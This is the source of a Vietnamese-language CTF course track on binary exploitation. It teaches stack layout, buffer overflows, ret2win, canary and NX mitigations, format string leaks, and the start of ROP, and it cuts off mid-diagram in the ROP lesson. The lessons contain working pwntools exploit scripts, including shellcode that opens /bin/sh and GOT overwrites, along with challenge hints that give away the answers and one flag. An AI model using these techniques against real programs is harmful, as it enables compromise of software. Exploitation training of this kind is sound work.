/* Track: pwn — Binary Exploitation */

/* ======================================================================
   Bài 1 — Bộ nhớ, stack và cách một chương trình chạy
====================================================================== */
lesson({
  id: "pwn",
  track: "pwn",
  order: 1,
  level: 1,
  title: "Bộ nhớ & Stack",
  short: "Layout bộ nhớ, stack frame, thanh ghi, little-endian",
  time: "35 phút",
  html: `
<h2 id="pwn-la-gi">Pwn là gì</h2>
<p>"Pwn" (binary exploitation) là khai thác lỗi quản lý bộ nhớ trong chương trình đã biên dịch — thường viết bằng C/C++ — để ép nó làm điều ngoài thiết kế: in flag, đọc vùng nhớ cấm, hoặc mở một shell. Đây là mảng khó nhất với người mới vì bạn phải hiểu bộ nhớ hoạt động ở mức rất thấp. Bài này xây nền tảng đó.</p>
<div class="callout warn"><b>Điều kiện</b><p>Bạn nên đã quen dòng lệnh Linux và đọc được chút C. Mọi thứ ở đây là <strong>x86-64</strong> trên Linux — kiến trúc phổ biến nhất trong CTF.</p></div>

<h2 id="bo-cuc">Bố cục bộ nhớ của một tiến trình</h2>
<p>Khi chương trình chạy, hệ điều hành cấp cho nó một không gian địa chỉ ảo, chia thành các vùng:</p>
<div class="diagram">
<svg viewBox="0 0 520 300" xmlns="http://www.w3.org/2000/svg" font-family="JetBrains Mono, monospace" font-size="12">
  <defs><marker id="ar" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 Z" fill="#8b98a9"/></marker></defs>
  <text x="10" y="20" fill="#5b6778">địa chỉ cao  0x7fff…</text>
  <rect x="140" y="30" width="240" height="46" fill="rgba(255,92,122,.12)" stroke="#ff5c7a"/>
  <text x="150" y="52" fill="#ff5c7a">Stack</text><text x="150" y="68" fill="#8b98a9">biến cục bộ, địa chỉ trả về</text>
  <line x1="400" y1="40" x2="400" y2="70" stroke="#8b98a9" marker-end="url(#ar)"/><text x="410" y="58" fill="#8b98a9">mọc xuống</text>
  <rect x="140" y="92" width="240" height="40" fill="rgba(165,139,255,.1)" stroke="#a58bff"/>
  <text x="150" y="116" fill="#a58bff">Heap  —  malloc()</text>
  <line x1="400" y1="122" x2="400" y2="96" stroke="#8b98a9" marker-end="url(#ar)"/><text x="410" y="114" fill="#8b98a9">mọc lên</text>
  <rect x="140" y="148" width="240" height="34" fill="rgba(255,200,87,.1)" stroke="#ffc857"/>
  <text x="150" y="169" fill="#ffc857">.data / .bss  —  biến toàn cục</text>
  <rect x="140" y="198" width="240" height="34" fill="rgba(92,200,255,.1)" stroke="#5cc8ff"/>
  <text x="150" y="219" fill="#5cc8ff">.text  —  mã máy (chỉ đọc + chạy)</text>
  <text x="10" y="255" fill="#5b6778">địa chỉ thấp  0x400000</text>
</svg>
</div>
<p>Hai vùng ta quan tâm nhất trong pwn cơ bản là <strong>stack</strong> (bài này đến bài 4) và <strong>heap</strong> (bài cuối).</p>

<h2 id="thanh-ghi">Thanh ghi cần nhớ</h2>
<p>CPU làm việc qua các thanh ghi — ô nhớ siêu nhanh bên trong. Trên x86-64, mỗi thanh ghi rộng 64 bit (8 byte):</p>
<table>
<tr><th>Thanh ghi</th><th>Vai trò</th></tr>
<tr><td><code>rip</code></td><td>Con trỏ lệnh — địa chỉ của lệnh <strong>sắp chạy</strong>. Chiếm được rip là điều khiển được chương trình.</td></tr>
<tr><td><code>rsp</code></td><td>Con trỏ đỉnh stack — luôn trỏ vào ô trên cùng của stack.</td></tr>
<tr><td><code>rbp</code></td><td>Con trỏ đáy stack frame hiện tại (mốc cố định để truy cập biến).</td></tr>
<tr><td><code>rdi, rsi, rdx, rcx, r8, r9</code></td><td>6 tham số đầu khi gọi hàm, theo đúng thứ tự này.</td></tr>
<tr><td><code>rax</code></td><td>Giá trị trả về của hàm.</td></tr>
</table>
<div class="callout tip"><b>Quy tắc gọi hàm (System V AMD64)</b><p>Để gọi <code>system("/bin/sh")</code>, bạn cần đặt <code>rdi</code> = địa chỉ chuỗi <code>"/bin/sh"</code> rồi nhảy vào <code>system</code>. Ghi nhớ điều này — nó là chìa khoá của bài ROP.</p></div>

<h2 id="stack-frame">Stack frame & lời gọi hàm</h2>
<p>Mỗi lần gọi một hàm, CPU tạo một <strong>stack frame</strong>. Lệnh <code>call func</code> làm hai việc: <strong>đẩy địa chỉ trả về</strong> (lệnh ngay sau <code>call</code>) lên stack, rồi nhảy vào <code>func</code>. Phần mở đầu hàm (prologue) lưu <code>rbp</code> cũ:</p>
${asm`
; prologue điển hình
push rbp            ; lưu rbp của hàm gọi
mov  rbp, rsp       ; đặt mốc frame mới
sub  rsp, 0x20      ; chừa 0x20 byte cho biến cục bộ
; ... thân hàm ...
; epilogue
leave               ; = mov rsp, rbp ; pop rbp
ret                 ; lấy địa chỉ trả về từ đỉnh stack, nhảy về đó
`}
<p>Nhìn từ địa chỉ thấp lên cao, một frame trông như sau (stack mọc xuống, nên biến cục bộ nằm ở địa chỉ thấp hơn địa chỉ trả về):</p>
<div class="diagram">
<svg viewBox="0 0 520 250" xmlns="http://www.w3.org/2000/svg" font-family="JetBrains Mono, monospace" font-size="12">
  <text x="10" y="18" fill="#5b6778">địa chỉ thấp (rsp)</text>
  <rect x="150" y="26" width="220" height="34" fill="rgba(92,200,255,.12)" stroke="#5cc8ff"/><text x="162" y="47" fill="#5cc8ff">char buf[...]  ← biến cục bộ</text>
  <rect x="150" y="64" width="220" height="30" fill="rgba(255,200,87,.12)" stroke="#ffc857"/><text x="162" y="84" fill="#ffc857">saved rbp (8 byte)</text>
  <rect x="150" y="98" width="220" height="30" fill="rgba(61,255,162,.14)" stroke="#3dffa2"/><text x="162" y="118" fill="#3dffa2">return address (8 byte)</text>
  <rect x="150" y="132" width="220" height="30" fill="rgba(255,255,255,.03)" stroke="#2a3546"/><text x="162" y="152" fill="#8b98a9">… frame của hàm gọi …</text>
  <text x="10" y="180" fill="#5b6778">địa chỉ cao</text>
  <path d="M385,41 L470,41 L470,113 L385,113" fill="none" stroke="#ff5c7a" stroke-dasharray="4"/>
  <text x="388" y="80" fill="#ff5c7a" font-size="11">ghi quá buf</text><text x="388" y="95" fill="#ff5c7a" font-size="11">sẽ đè 2 ô này</text>
</svg>
</div>
<p>Toàn bộ pwn cơ bản xoay quanh ô màu xanh lá: <strong>nếu ghi đè được return address, khi hàm <code>ret</code> bạn quyết định rip nhảy đi đâu.</strong></p>

<h2 id="endian">Little-endian — thứ tự byte</h2>
<p>x86-64 lưu số nhiều byte theo kiểu <strong>little-endian</strong>: byte thấp nhất ở địa chỉ thấp nhất. Giá trị <code>0x0000000000401196</code> nằm trong bộ nhớ là:</p>
${txt`
địa chỉ:  +0   +1   +2   +3   +4   +5   +6   +7
byte:     96   11   40   00   00   00   00   00
`}
<p>Vì vậy khi muốn ghi một địa chỉ vào stack, bạn phải xuất byte theo thứ tự đảo. Đừng tính tay — hàm <code>p64()</code> của pwntools làm việc đó:</p>
${py`
from pwn import *
p64(0x401196)        # => b'\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00'
p32(0x41424344)      # => b'DCBA'   (32-bit, 4 byte)
u64(b'\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00')  # => 0x401196  (giải mã ngược)
`}
<p>Hãy tự kiểm tra ở tab <a href="#/tools/convert">Công cụ → Chuyển đổi số</a>: gõ <code>zCTF</code> sẽ thấy "chữ (little-endian)" là <code>FTCz</code>.</p>

<h2 id="overflow">Lỗ hổng đầu tiên: ghi đè biến lân cận</h2>
<p>Hàm <code>gets()</code> đọc dữ liệu vào buffer mà <strong>không kiểm tra độ dài</strong>. Nếu buffer nằm cạnh một biến quan trọng, dữ liệu dư sẽ tràn sang đè biến đó:</p>
${c`
#include <stdio.h>
void print_flag(void);

int main() {
    int  is_admin = 0;    // nằm ngay sau buf trên stack
    char buf[16];
    gets(buf);            // KHÔNG giới hạn — nhập 17 byte là tràn
    if (is_admin != 0)
        print_flag();     // chỉ chạy khi is_admin khác 0
}
`}
<p>Thử ngay: gõ hơn 16 ký tự để tràn sang <code>is_admin</code>. Ký tự thứ 17 trở đi rơi vào vùng <code>is_admin</code>.</p>
<div data-widget="stack"></div>
<div data-chal="pw1"></div>
<p>Khó hơn: lần này <code>is_admin</code> phải bằng đúng <code>0x41424344</code>. Nhớ little-endian — bạn gõ <code>"A"</code>(0x41) trước hay sau?</p>
<div data-chal="pw2"></div>

<h2 id="pwntools-intro">Giới thiệu pwntools</h2>
<p><a href="https://docs.pwntools.com/" target="_blank" rel="noopener">pwntools</a> là thư viện Python chuẩn mực để viết exploit: đóng gói số, kết nối tới dịch vụ, gửi/nhận byte chính xác.</p>
${py`
from pwn import *

# p = process("./login")               # chạy local
p = remote("challenge.site", 1337)      # hoặc kết nối server
payload = b"A" * 16 + p32(0x41424344)   # 16 byte đệm + giá trị is_admin
p.sendline(payload)                      # gửi kèm newline
print(p.recvall().decode())              # đọc toàn bộ phản hồi (có flag)
`}
<div data-quiz="0"></div>
<div data-quiz="1"></div>

<div class="callout idea"><b>Luyện thêm</b><p><a href="https://pwn.college/" target="_blank" rel="noopener">pwn.college</a> (ĐH Arizona) dạy pwn bài bản từ số 0. Kênh <a href="https://www.youtube.com/@LiveOverflow" target="_blank" rel="noopener">LiveOverflow</a> giải thích rất trực quan. Thực hành ở tab <a href="#/tools/shell">Công cụ → Terminal</a> với lệnh <code>checksec</code>, <code>xxd</code>.</p></div>
`,
  quiz: [
    {
      q: "Muốn ghi số <code>0xdeadbeef</code> vào bộ nhớ x86-64, bạn gửi các byte theo thứ tự nào?",
      options: ["de ad be ef", "ef be ad de", "be ef de ad", "Thứ tự nào cũng được"],
      answer: 1,
      explain: "Little-endian: byte thấp nhất (ef) nằm ở địa chỉ thấp nhất, nên đi trước. <code>p32(0xdeadbeef)</code> cho ra <code>b'\\xef\\xbe\\xad\\xde'</code>.",
    },
    {
      q: "Lệnh <code>ret</code> ở cuối hàm làm gì?",
      options: [
        "Xoá toàn bộ stack frame",
        "Lấy 8 byte ở đỉnh stack làm địa chỉ rồi nhảy (đặt vào rip)",
        "Trả giá trị trong rbp cho hàm gọi",
        "Dừng chương trình",
      ],
      answer: 1,
      explain: "<code>ret</code> = pop một giá trị khỏi stack vào rip. Nếu ô đó là return address thật thì về đúng chỗ; nếu ta đã đè nó thì rip nhảy tới nơi ta chọn.",
    },
  ],
  challenges: {
    pw1: { title: "Tràn bộ đệm", pts: 100, diff: "easy", hash: "6866180478b03fcd254b1e320cd3fae574b19b3a89a4da9af97f33583bc481d6", body: "<p>Trong mô phỏng trên, làm cho <code>is_admin</code> khác 0 để chương trình in flag.</p>", hints: ["<code>buf</code> chứa 16 byte. Bạn cần nhập nhiều hơn 16 ký tự.", "Thử 17 ký tự <code>A</code>: <code>AAAAAAAAAAAAAAAAB</code> — ký tự thứ 17 tràn vào is_admin."] },
    pw2: { title: "Giá trị chính xác", pts: 150, diff: "med", hash: "d4b193d51f5c5a549e1a0d278f8d00953816a04c6c801fc0e01f3847a2f49a17", body: "<p>Nâng cấp: chương trình chỉ in flag thứ hai khi <code>is_admin == 0x41424344</code>.</p>", hints: ["<code>0x41</code>=A, <code>0x42</code>=B, <code>0x43</code>=C, <code>0x44</code>=D.", "Little-endian: byte thấp (0x44 = D) đi trước. 16 ký tự đệm rồi <code>DCBA</code>.", "Nhập: <code>AAAAAAAAAAAAAAAADCBA</code>"] },
  },
});

/* ======================================================================
   Bài 2 — Buffer overflow & ret2win
====================================================================== */
lesson({
  id: "pwn-ret2win",
  track: "pwn",
  order: 2,
  level: 2,
  title: "Buffer Overflow & ret2win",
  short: "Ghi đè return address, tính offset, nhảy vào hàm win()",
  time: "45 phút",
  html: `
<h2 id="y-tuong">Ý tưởng ret2win</h2>
<p>Ở bài 1 ta chỉ đè một biến cục bộ. Giờ ta đè xa hơn — tới chính <strong>return address</strong>. Nhiều bài CTF cố tình để sẵn một hàm "chiến thắng" (thường tên <code>win</code>, <code>flag</code>, <code>secret</code>) không bao giờ được gọi trong luồng bình thường. Kỹ thuật <strong>ret2win</strong>: tràn buffer, đặt địa chỉ của <code>win</code> vào return address, để khi hàm <code>ret</code> thì rip nhảy thẳng vào <code>win</code>.</p>
${c`
void win() {               // không ai gọi hàm này...
    system("/bin/cat flag.txt");
}
void vuln() {
    char buf[32];
    read(0, buf, 256);     // đọc tận 256 byte vào buf[32] → tràn
}
int main() { vuln(); }
`}

<h2 id="offset">Bước 1: tìm offset tới return address</h2>
<p>Trước tiên phải biết <strong>cần bao nhiêu byte đệm</strong> để chạm return address: bằng kích thước buffer + phần căn lề + 8 byte <code>saved rbp</code>. Đừng đoán — dùng <strong>cyclic pattern</strong> (chuỗi De Bruijn, mỗi 4 byte là duy nhất) của pwntools:</p>
${py`
from pwn import *
p = process("./vuln")
p.sendline(cyclic(100))        # gửi aaaabaaacaaadaaa...
p.wait()
core = p.corefile               # chương trình crash, đọc core dump
rip = core.read(core.rsp - 8, 8)   # 4 byte đè lên rip
print(cyclic_find(rip))         # => ví dụ 40  → offset chính là 40
`}
<div class="callout tip"><b>Vì sao cyclic hiệu quả</b><p>Vì mỗi đoạn 4 byte trong chuỗi chỉ xuất hiện một lần, nhìn 4 byte rơi vào rip là suy ra ngay vị trí của chúng trong payload → đó là offset. Nhanh hơn thử dần nhiều.</p></div>

<h2 id="payload">Bước 2: dựng payload</h2>
<p>Lấy địa chỉ hàm <code>win</code> (xem bằng <code>objdump -d ./vuln | grep win</code> hoặc trong Ghidra), rồi:</p>
${py`
offset = 40
win    = 0x401176
payload = b"A" * offset + p64(win)
p.sendline(payload)
`}
<p>Thử trong mô phỏng dưới đây. Bấm chip <em>win</em> để chèn địa chỉ, hoặc tự gõ. Quan sát rip nhảy đi đâu khi <code>ret</code> chạy. Offset đúng là <strong>40</strong>.</p>
<div data-widget="ret2win" data-offset="40" data-win="0x401176" data-flag="ret1"></div>
<div data-chal="pwn-ret2win-1"></div>

<h2 id="alignment">Căn lề stack 16 byte (movaps)</h2>
<p>Một cái bẫy kinh điển: glibc hiện đại yêu cầu <code>rsp</code> là bội số của 16 khi gọi hàm dùng lệnh SSE (<code>movaps</code>). Sau khi bạn đè return address, rsp có thể lệch 8 byte → chương trình nhảy đúng vào <code>win</code> nhưng crash tại <code>movaps</code> bên trong. Cách sửa: chèn thêm một gadget <strong><code>ret</code></strong> (chỉ một lệnh ret) ngay <em>trước</em> địa chỉ win. Gadget này "nuốt" 8 byte, đẩy rsp về đúng bội số 16 rồi mới vào win.</p>
${py`
ret    = 0x40101a      # địa chỉ một lệnh 'ret' đơn (ROPgadget tìm ra)
win    = 0x401176
payload = b"A" * 40 + p64(ret) + p64(win)   # thêm p64(ret) để căn lề
`}
<p>Mô phỏng bên dưới bật chế độ căn lề: chỉ <code>p64(win)</code> sẽ báo lỗi movaps; phải chèn <code>p64(ret)</code> trước.</p>
<div data-widget="ret2win" data-offset="40" data-win="0x401176" data-retg="0x40101a" data-align="1" data-flag="ret2"></div>
<div data-chal="pwn-ret2win-2"></div>

<h2 id="script-day-du">Script hoàn chỉnh</h2>
${py`
from pwn import *
elf = context.binary = ELF("./vuln")
p = process("./vuln")

offset = 40
ret    = 0x40101a
payload = flat(
    b"A" * offset,
    p64(ret),            # căn lề 16 byte
    elf.symbols["win"],  # pwntools tự lấy địa chỉ win & đóng gói
)
p.sendline(payload)
p.interactive()          # nhận shell / đọc flag
`}
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Buffer <code>char buf[32]</code>, sau nó là 8 byte saved rbp rồi return address. Offset để chạm return address là bao nhiêu?",
      options: ["32", "36", "40", "48"],
      answer: 2,
      explain: "32 (buf) + 8 (saved rbp) = 40 byte đệm thì byte tiếp theo mới ghi vào return address. Luôn kiểm bằng cyclic để chắc chắn vì trình biên dịch có thể thêm padding.",
    },
  ],
  challenges: {
    "pwn-ret2win-1": { title: "ret2win", pts: 150, diff: "med", hash: "efd72be06f5174da6d4f0d985969b426752dbefee06754ec3b223a31e83c396d", body: "<p>Dùng mô phỏng ở phần trên (offset 40, địa chỉ <code>win</code> = <code>0x401176</code>). Dựng payload để rip nhảy vào win().</p>", hints: ["Payload = đệm tới return address + địa chỉ win đóng gói little-endian.", 'Gõ: <code>"A"*40 + p64(0x401176)</code> — hoặc bấm chip <em>win</em> sau khi gõ <code>"A"*40 +</code>.'] },
    "pwn-ret2win-2": { title: "Căn lề stack", pts: 200, diff: "hard", hash: "2dc6b6a724f63b03608851ebb55cb6ab8512caee6d0ccab807b3c00b370bf2ea", body: "<p>Mô phỏng thứ hai bật kiểm tra căn lề 16 byte. Chỉ nhảy win() sẽ gặp lỗi movaps. Thêm một ret gadget để sửa.</p>", hints: ["Một lệnh <code>ret</code> (gadget 0x40101a) sẽ đẩy rsp thêm 8 byte, đưa về bội số 16.", "Đặt ret gadget NGAY TRƯỚC win.", 'Gõ: <code>"A"*40 + p64(0x40101a) + p64(0x401176)</code>'] },
  },
});

/* ======================================================================
   Bài 3 — Cơ chế bảo vệ & shellcode
====================================================================== */
lesson({
  id: "pwn-mitigations",
  track: "pwn",
  order: 3,
  level: 2,
  title: "Cơ chế bảo vệ & Shellcode",
  short: "NX, ASLR, PIE, canary, RELRO, checksec",
  time: "35 phút",
  html: `
<h2 id="checksec">checksec — đọc "giáp" của binary</h2>
<p>Trước khi khai thác, luôn chạy <code>checksec</code> (có trong pwntools) để biết chương trình bật những lớp bảo vệ nào. Cách khai thác phụ thuộc hoàn toàn vào kết quả này.</p>
${sh`
$ checksec ./vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found      # ← không có canary, overflow thoải mái
    NX:       NX enabled           # ← stack không chạy code
    PIE:      No PIE (0x400000)    # ← địa chỉ cố định, dễ ret2win
`}

<h2 id="cac-co-che">Bốn cơ chế bạn phải biết</h2>
<div class="grid-2">
  <div class="card"><h4>Stack Canary</h4><p>Đặt một giá trị ngẫu nhiên ("canary") ngay trước saved rbp/return address. Trước khi <code>ret</code>, chương trình kiểm tra canary còn nguyên không. Overflow tuyến tính sẽ đè canary → phát hiện → <code>*** stack smashing detected ***</code> và abort. Byte cuối của canary luôn là <code>00</code>.</p></div>
  <div class="card"><h4>NX / DEP</h4><p>Đánh dấu stack "không thực thi". Ngày xưa ta chèn shellcode vào buffer rồi nhảy vào đó; NX chặn điều này. Lời đáp: <strong>ROP</strong> — tái dùng code sẵn có thay vì chèn code mới (bài 5).</p></div>
  <div class="card"><h4>ASLR</h4><p>Ngẫu nhiên hoá địa chỉ stack, heap, và thư viện (libc) mỗi lần chạy. Không thể hardcode địa chỉ libc → phải <strong>leak</strong> một địa chỉ lúc chạy rồi tính ra phần còn lại.</p></div>
  <div class="card"><h4>PIE</h4><p>Ngẫu nhiên hoá cả địa chỉ code của chính chương trình. Không PIE → <code>win</code> luôn ở <code>0x401176</code> (bài 2 dễ). Có PIE → phải leak địa chỉ base của binary trước.</p></div>
</div>
<div class="callout tip"><b>Chiến lược theo checksec</b><p><strong>No canary + No PIE</strong> → ret2win trực tiếp (bài 2). <strong>Có canary</strong> → phải leak canary rồi ghép lại vào payload. <strong>NX + ASLR</strong> → ret2libc / ROP + leak (bài 5).</p></div>

<h2 id="canary-leak">Vượt canary bằng cách nào?</h2>
<p>Canary không "phá" được, chỉ <strong>đọc trộm rồi ghi lại nguyên vẹn</strong>. Nếu có lỗ hổng leak bộ nhớ (format string ở bài 4, hoặc đọc dư), ta lấy giá trị canary, rồi dựng payload: <code>đệm + canary + saved_rbp + return_address</code>. Canary đúng chỗ nên kiểm tra qua được.</p>
${py`
# giả sử đã leak được canary (bài 4 dạy cách leak)
canary = 0x3b8f71a2c4d90000
payload = b"A"*40 + p64(canary) + p64(0)      # p64(0): saved rbp giả
payload += p64(win)                            # rồi mới tới return address
`}

<h2 id="shellcode">Shellcode là gì</h2>
<p><strong>Shellcode</strong> là một đoạn mã máy rất ngắn, thường để mở shell (<code>execve("/bin/sh", 0, 0)</code>). Khi stack còn thực thi được (NX tắt), ta chèn shellcode vào buffer và trỏ rip vào đó. pwntools tự sinh shellcode đúng kiến trúc:</p>
${py`
context.arch = "amd64"
sc = asm(shellcraft.sh())      # sinh mã máy mở /bin/sh
# nếu stack thực thi được & biết địa chỉ buf:
payload = sc.ljust(40, b"\\x90") + p64(buf_addr)  # \\x90 = NOP
`}
<p>Thực tế NX gần như luôn bật, nên shellcode-trên-stack hiếm gặp; nhưng khái niệm execve("/bin/sh") là đích đến chung của mọi kỹ thuật.</p>

<h2 id="doc-checksec">Thực hành đọc checksec</h2>
<p>Trong <a href="#/tools/shell">Terminal</a>, một binary cho kết quả checksec như sau. Dựa vào đó chọn kỹ thuật và lấy flag mô tả đúng tình huống.</p>
${sh`
$ checksec ./target
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
`}
<div data-chal="pwn-mit-1"></div>
<div data-quiz="0"></div>
<div data-quiz="1"></div>
`,
  quiz: [
    {
      q: "checksec báo <code>NX: NX enabled</code>. Hệ quả trực tiếp là gì?",
      options: [
        "Không thể làm tràn buffer nữa",
        "Không thể chèn shellcode vào stack rồi chạy — phải dùng ROP/ret2libc",
        "Địa chỉ hàm bị ngẫu nhiên hoá",
        "Canary được bật",
      ],
      answer: 1,
      explain: "NX khiến stack không thực thi. Overflow vẫn làm được, nhưng không nhảy vào shellcode trên stack; thay vào đó tái dùng code có sẵn (ROP, ret2libc).",
    },
    {
      q: "Vì sao byte cuối (thấp nhất) của stack canary trên Linux luôn là <code>0x00</code>?",
      options: [
        "Cho đẹp",
        "Để các hàm chuỗi như strcpy dừng ở canary, chống leak canary bằng lỗi off-by-one chuỗi",
        "Vì canary chỉ dài 7 byte",
        "Để canary luôn là số chẵn",
      ],
      answer: 1,
      explain: "Byte null ở cuối khiến các hàm xử lý chuỗi coi đó là kết thúc chuỗi, nên một lần ghi/đọc chuỗi khó vô tình để lộ hoặc giữ nguyên canary. Đây gọi là null-byte canary.",
    },
  ],
  challenges: {
    "pwn-mit-1": { title: "Đọc giáp", pts: 100, diff: "easy", hash: "6d4e9bc304b627544c8e28b368e21b5d422ee8a646e5bc1564d2c12e7dba34eb", body: '<p>Với <code>./target</code> ở trên (No canary, NX enabled, No PIE): kỹ thuật đơn giản nhất để nhảy vào hàm win có địa chỉ cố định là gì? Nhập flag <code>zCTF{d0c_checksec_k7}</code> sau khi chắc chắn bạn hiểu vì sao — No PIE + No canary = <strong>ret2win</strong> thẳng.</p>', hints: ["No canary nghĩa là overflow không bị chặn. No PIE nghĩa là địa chỉ win cố định.", "Đây chính là kỹ thuật bài 2. Flag là <code>zCTF{d0c_checksec_k7}</code>."] },
  },
});

/* ======================================================================
   Bài 4 — Format string
====================================================================== */
lesson({
  id: "pwn-fmtstr",
  track: "pwn",
  order: 4,
  level: 3,
  title: "Format String",
  short: "%p %x %s %n — đọc stack, leak canary, ghi tuỳ ý",
  time: "40 phút",
  html: `
<h2 id="loi">Lỗi format string đến từ đâu</h2>
<p>Khi lập trình viên đưa dữ liệu người dùng <strong>trực tiếp</strong> làm chuỗi định dạng của <code>printf</code>:</p>
${c`
char buf[128];
read(0, buf, 128);
printf(buf);          // SAI! — đúng ra phải là printf("%s", buf)
`}
<p>Nếu bạn nhập <code>%p %p %p</code>, <code>printf</code> tưởng đó là chỉ thị định dạng và đi <strong>đọc các tham số</strong> tương ứng — nhưng bạn đâu có truyền tham số nào! Nó bèn đọc bừa các giá trị đang nằm trên stack và trong thanh ghi, rồi in ra. Đây là lỗ hổng <strong>đọc bộ nhớ tuỳ ý</strong>, và với <code>%n</code> là <strong>ghi bộ nhớ tuỳ ý</strong>.</p>

<h2 id="specifiers">Các chỉ thị quan trọng</h2>
<table>
<tr><th>Chỉ thị</th><th>Tác dụng khi khai thác</th></tr>
<tr><td><code>%p</code></td><td>In một giá trị trên stack dạng con trỏ (hex). Rải nhiều <code>%p</code> để "quét" stack.</td></tr>
<tr><td><code>%x</code></td><td>Giống %p nhưng 4 byte (32-bit).</td></tr>
<tr><td><code>%s</code></td><td>Coi tham số là <strong>con trỏ</strong> và in chuỗi mà nó <strong>trỏ tới</strong> — leak nội dung ở địa chỉ bất kỳ.</td></tr>
<tr><td><code>%n</code></td><td><strong>Ghi</strong> số ký tự đã in được vào địa chỉ mà tham số trỏ tới — cho phép ghi giá trị tuỳ ý.</td></tr>
<tr><td><code>%7$p</code></td><td>Truy cập trực tiếp tham số thứ 7, khỏi cần rải 7 cái <code>%p</code>.</td></tr>
</table>

<h2 id="offset">Tìm offset tham số</h2>
<p>Để biết dữ liệu bạn nhập nằm ở tham số thứ mấy, gửi một mốc dễ nhận (<code>AAAA</code> = 0x41414141) kèm chuỗi <code>%p</code>:</p>
${sh`
$ ./echo
AAAA.%p.%p.%p.%p.%p.%p
AAAA.0x7fff....0x0.0x41414141.0x...
# thấy 0x41414141 ở vị trí %p thứ 3  → offset = 3
# từ đó có thể dùng %3$p cho gọn
`}

<h2 id="leak-canary">Khai thác 1: leak canary</h2>
<p>Canary nằm đâu đó trên stack. Quét bằng <code>%p</code> để tìm giá trị trông giống canary (số lớn, byte cuối <code>00</code>). Thử trong mô phỏng: canary ở tham số thứ 6.</p>
<div data-widget="fmtstr" data-goal="canary" data-flag="fmt1"></div>
<div data-chal="pwn-fmt-1"></div>

<h2 id="leak-secret">Khai thác 2: đọc chuỗi bí mật bằng %s</h2>
<p>Nếu trên stack có một <strong>con trỏ</strong> tới dữ liệu bí mật, <code>%s</code> tại đúng vị trí sẽ in nội dung nó trỏ tới (khác với <code>%p</code> chỉ in địa chỉ con trỏ). Con trỏ bí mật ở tham số thứ 5.</p>
<div data-widget="fmtstr" data-goal="secret" data-flag="fmt2"></div>
<div data-chal="pwn-fmt-2"></div>

<h2 id="ghi-n">Khai thác 3: ghi bằng %n (khái niệm)</h2>
<p><code>%n</code> ghi <em>số ký tự đã in</em> vào địa chỉ con trỏ. Kết hợp đệm độ rộng (<code>%100c</code> in 100 ký tự) và <code>%n</code>, ta ghi giá trị tuỳ ý vào địa chỉ tuỳ ý — ví dụ sửa một biến, hoặc ghi đè một entry trong GOT để chiếm luồng. pwntools tự lo phần tính toán rối rắm này:</p>
${py`
from pwn import *
p = process("./echo")
# ghi giá trị 'win' vào GOT entry của exit, dùng offset tham số = 6
payload = fmtstr_payload(6, {elf.got["exit"]: elf.symbols["win"]})
p.sendline(payload)
`}
<div class="callout warn"><b>Lưu ý</b><p><code>%n</code> bị nhiều hệ thống chặn (FORTIFY). Trong CTF, format string hay dùng nhất để <strong>leak</strong> (canary, địa chỉ libc/PIE) rồi kết hợp với ROP.</p></div>
<div data-quiz="0"></div>
`,
  quiz: [
    {
      q: "Khác nhau giữa <code>%3$p</code> và <code>%3$s</code> khi tham số thứ 3 là một con trỏ tới chuỗi là gì?",
      options: [
        "Không khác gì",
        "%p in giá trị con trỏ (địa chỉ); %s đi theo con trỏ và in chuỗi tại địa chỉ đó",
        "%s in địa chỉ; %p in chuỗi",
        "%s chỉ dùng cho số",
      ],
      answer: 1,
      explain: "%p in chính giá trị (địa chỉ). %s coi giá trị là con trỏ và deref — in nội dung được trỏ tới. Vì thế %s nguy hiểm: leak được dữ liệu ở địa chỉ bất kỳ nằm trên stack.",
    },
  ],
  challenges: {
    "pwn-fmt-1": { title: "Leak canary", pts: 175, diff: "med", hash: "fe86f7eb39e9d2e4c030adabba271ae82b5b9135d17b8ee59824d1f42fb4f2e5", body: "<p>Dùng mô phỏng format string (mục leak canary). Leak giá trị canary ở tham số thứ 6.</p>", hints: ["Rải <code>%p</code> và đếm, hoặc dùng trực tiếp <code>%6$p</code>.", "Canary là số lớn có byte cuối <code>00</code>. Gõ <code>%6$p</code>."] },
    "pwn-fmt-2": { title: "Đọc bí mật bằng %s", pts: 200, diff: "hard", hash: "dc777bea7c3ffba8f97d03f58d0676d31d1df52314ed937d7778ffd616c77647", body: "<p>Mô phỏng thứ hai: tham số thứ 5 là con trỏ tới chuỗi bí mật. Đọc nội dung nó trỏ tới.</p>", hints: ["Phải deref con trỏ, nên dùng <code>%s</code> chứ không phải <code>%p</code>.", "Nhắm đúng tham số 5: gõ <code>%5$s</code>."] },
  },
});

/* ======================================================================
   Bài 5 — ROP & ret2libc
====================================================================== */
lesson({
  id: "pwn-rop",
  track: "pwn",
  order: 5,
  level: 3,
  title: "ROP & ret2libc",
  short: "Gadget, pop rdi; ret, gọi system(\"/bin/sh\"), vượt NX+ASLR",
  time: "50 phút",
  html: `
<h2 id="vi-sao-rop">Vì sao cần ROP</h2>
<p>NX khiến ta không chèn và chạy shellcode trên stack được. Nhưng ta vẫn kiểm soát được return address (và cả stack phía sau nó). <strong>Return-Oriented Programming (ROP)</strong>: thay vì chèn code mới, ta xâu chuỗi những mẩu code <em>đã có sẵn</em> trong binary/libc, mỗi mẩu kết thúc bằng <code>ret</code>.</p>

<h2 id="gadget">Gadget là gì</h2>
<p>Một <strong>gadget</strong> là vài lệnh kết thúc bằng <code>ret</code>, ví dụ:</p>
${asm`
0x401293:  pop rdi ; ret      ; nạp 8 byte kế tiếp trên stack vào rdi, rồi ret
0x401295:  pop rsi ; ret      ; tương tự cho rsi
0x40101a:  ret                ; chỉ một lệnh ret (dùng để căn lề)
`}
<p>Vì mỗi gadget kết thúc bằng <code>ret</code> (pop địa chỉ kế tiếp vào rip), ta xếp liên tiếp <strong>địa chỉ gadget</strong> và <strong>dữ liệu</strong> trên stack để chúng chạy nối đuôi nhau như một "chương trình" mới. Tìm gadget bằng <code>ROPgadget --binary ./vuln</code> hoặc <code>ropper</code>.</p>

<h2 id="co-che">Cơ chế một chuỗi ROP</h2>
<div class="diagram">
